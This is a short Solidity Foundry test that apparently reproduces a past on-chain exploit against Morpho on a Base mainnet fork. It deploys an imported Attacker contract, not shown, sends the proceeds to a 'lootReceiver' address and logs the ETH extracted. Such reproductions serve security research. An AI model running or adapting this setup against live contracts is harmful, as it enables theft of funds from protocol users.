// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Attacker} from "../src/Attacker.sol";

contract AttackTest is Test {
    uint256 baseFork;

    address lootReceiver = 0xE9f853d2616ac6b04E5fC2B4Be6EB654b9F224Cd;
    address morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address weth = 0x4200000000000000000000000000000000000006;

    Attacker public attacker;

    function setUp() public {
        string memory BASE_RPC_URL = vm.envString("BASE_RPC_URL");
        // we will test on the base mainnet fork at specific block
        // reproduce 0x14ea5b572a01234c9499174ada90d6a20af016749458297a8b071d8271f3ed77
        baseFork = vm.createFork(BASE_RPC_URL, 29437733);
        vm.selectFork(baseFork);

        attacker = new Attacker(lootReceiver, morpho, weth);
    }

    function testAttack() public {
        uint256 wethEthBalanceBefore = lootReceiver.balance;

        attacker.attack();

        uint256 wethEthBalanceAfter = lootReceiver.balance;
        console.log("WETH balance before attack:", wethEthBalanceBefore);
        console.log("WETH balance  after attack:", wethEthBalanceAfter);
        console.log("                 Extracted:  ", int256(wethEthBalanceAfter) - int256(wethEthBalanceBefore));
    }
}
